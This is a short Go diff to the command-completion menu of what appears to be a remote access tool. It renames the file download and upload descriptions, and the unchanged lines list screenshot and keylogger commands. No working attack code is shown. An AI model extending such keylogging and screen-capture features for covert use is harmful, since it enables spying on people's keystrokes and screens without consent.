@@ -29,8 +29,8 @@ func ServerCompleter(d prompt.Document) []prompt.Suggest {
 
 func ClientCompleter(d prompt.Document) []prompt.Suggest {
 	s := []prompt.Suggest{
-		{Text: "download", Description: "File Download"},
-		{Text: "upload", Description: "File Upload"},
+		{Text: "download", Description: "ReceiveFile Download"},
+		{Text: "upload", Description: "ReceiveFile Upload"},
 		{Text: "screenshot", Description: "Take a Screenshot"},
 		{Text: "keylogger_start", Description: "Start Keylogger session"},
 		{Text: "keylogger_show", Description: "Show Keylogger session logs"},
